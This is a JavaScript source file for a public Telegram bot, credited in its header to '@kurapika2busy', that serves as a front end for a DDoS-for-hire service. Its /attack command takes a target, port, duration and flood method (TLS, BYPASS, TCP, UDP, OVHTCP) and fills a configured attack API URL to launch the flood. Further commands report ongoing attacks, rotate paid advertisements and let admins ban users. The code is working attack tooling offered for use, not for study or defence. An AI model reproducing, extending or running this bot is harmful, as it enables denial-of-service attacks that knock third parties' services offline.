const { Telegraf } = require('telegraf');
const axios = require('axios');
const fs = require('fs');
const sqlite3 = require('sqlite3').verbose();
const db = require('./database');

/* 

********* PUBLIC TELEGRAM BOT MADE BY @kurapika2busy *********

Telegram Channel: @kurapikaservice

*/

const bot = new Telegraf('token');
const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
let attackInProgress = false;
let currentAttack = null;

const isAdmin = async (ctx) => {
    const member = await ctx.telegram.getChatMember(ctx.chat.id, ctx.from.id);
    return ['administrator', 'creator'].includes(member.status);
};

const addUserToDB = (username) => {
    db.run("INSERT OR IGNORE INTO users (username, is_banned) VALUES (?, 0)", [username]);
};

const isUserBanned = (username, callback) => {
    db.get("SELECT is_banned FROM users WHERE username = ?", [username], (err, row) => {
        if (err) {
            console.error(err);
            return callback(false);
        }
        callback(row ? row.is_banned === 1 : false);
    });
};

const getAdvertisement = (callback) => {
    db.get("SELECT text FROM advertisement WHERE id = 1", (err, row) => {
        if (err) {
            console.error(err);
            return callback('You can purchase advertisement spot');
        }
        callback(row ? row.text : 'Default advertisement text');
    });
};

const setAdvertisement = (text, callback) => {
    db.run("UPDATE advertisement SET text = ? WHERE id = 1", [text], function (err) {
        if (err) {
            console.error(err);
            return callback(false);
        }
        callback(true);
    });
};

bot.start((ctx) => {
    ctx.reply('Hello! I am a bot ready to assist you.');
});

bot.command('methods', (ctx) => {
    const methods = ['TLS', 'BYPASS', 'TCP', 'UDP', 'OVHTCP'].join(', ');
    ctx.reply(`Available methods: ${methods}`);
});

bot.command('attack', async (ctx) => {
    const username = ctx.from.username;
    isUserBanned(username, async (banned) => {
        if (banned) {
            return ctx.reply('You are banned and cannot use this bot.');
        }

        if (attackInProgress) {
            return ctx.reply('An attack is already in progress. Please wait.');
        }

        const [target, port, time, method] = ctx.message.text.split(' ').slice(1);
        const validMethods = ['TLS', 'BYPASS', 'TCP', 'UDP', 'OVHTCP'];
        const validTime = Number(time) >= 20 && Number(time) <= 60;

        if (!target || !port || !time || !method || !validMethods.includes(method) || !validTime) {
            return ctx.reply('Incorrect command format. Use: /attack <TARGET> <PORT> <TIME> <METHOD>');
        }

        attackInProgress = true;
        currentAttack = {
            target,
            port,
            time,
            method,
            username
        };

        const url = config.api_urls[method]
            .replace('<<$target>>', target)
            .replace('<<$port>>', port)
            .replace('<<$time>>', time);

        try {
            await axios.get(url);
            getAdvertisement((adText) => {
                ctx.reply(`Attack successfully sent!\n\n- Target: ${target} | Port: ${port} | Time: ${time}\n- Method: ${method}\n\nSender: @${username}\n\n------------------------------------\n${adText}`);
                addUserToDB(username);
            });
        } catch (error) {
            ctx.reply(`Error starting attack: ${error.message}`);
        }

        setTimeout(() => {
            attackInProgress = false;
            currentAttack = null;
        }, time * 1000);
    });
});

bot.command('ongoing', (ctx) => {
    if (!attackInProgress) {
        return ctx.reply('There are currently no ongoing attacks.');
    }

    const { target, port, time, method, username } = currentAttack;
    ctx.reply(`Running Attacks:\n- Target: ${target} | Port: ${port} | Time: ${time} | Method: ${method}\n- Username: @${username}`);
});

bot.command('addadvertisement', async (ctx) => {
    if (!await isAdmin(ctx)) {
        return ctx.reply('Only administrators can use this command.');
    }

    const adText = ctx.message.text.split(' ').slice(1).join(' ');
    if (!adText) {
        return ctx.reply('Use: /addadvertisement <Text>');
    }

    setAdvertisement(adText, (success) => {
        if (success) {
            ctx.reply('Advertisement text successfully updated.');
        } else {
            ctx.reply('Error updating advertisement text.');
        }
    });
});

bot.command('listusers', async (ctx) => {
    if (!await isAdmin(ctx)) {
        return ctx.reply('Only administrators can use this command.');
    }

    db.all("SELECT username, is_banned FROM users", (err, rows) => {
        if (err) {
            return ctx.reply('Error retrieving user list.');
        }

        if (rows.length === 0) {
            return ctx.reply('No users.');
        }

        const userList = rows.map(row => `- @${row.username} (banned: ${row.is_banned ? 'yes' : 'no'})`).join('\n');
        ctx.reply(`User list:\n${userList}`);
    });
});

bot.command('ban', async (ctx) => {
    if (!await isAdmin(ctx)) {
        return ctx.reply('Only administrators can use this command.');
    }

    const username = ctx.message.text.split(' ')[1];
    if (!username) {
        return ctx.reply('Use: /ban @username');
    }

    db.run("UPDATE users SET is_banned = 1 WHERE username = ?", [username], function (err) {
        if (err) {
            return ctx.reply('Error banning user.');
        }

        if (this.changes === 0) {
            return ctx.reply('User not found.');
        }

        ctx.reply(`User @${username} has been banned.`);
    });
});

bot.command('unban', async (ctx) => {
    if (!await isAdmin(ctx)) {
        return ctx.reply('Only administrators can use this command.');
    }

    const username = ctx.message.text.split(' ')[1];
    if (!username) {
        return ctx.reply('Use: /unban @username');
    }

    db.run("UPDATE users SET is_banned = 0 WHERE username = ?", [username], function (err) {
        if (err) {
            return ctx.reply('Error unbanning user.');
        }

        if (this.changes === 0) {
            return ctx.reply('User not found.');
        }

        ctx.reply(`User @${username} has been unbanned.`);
    });
});

bot.launch().then(() => {
    console.log('Bot started');
});
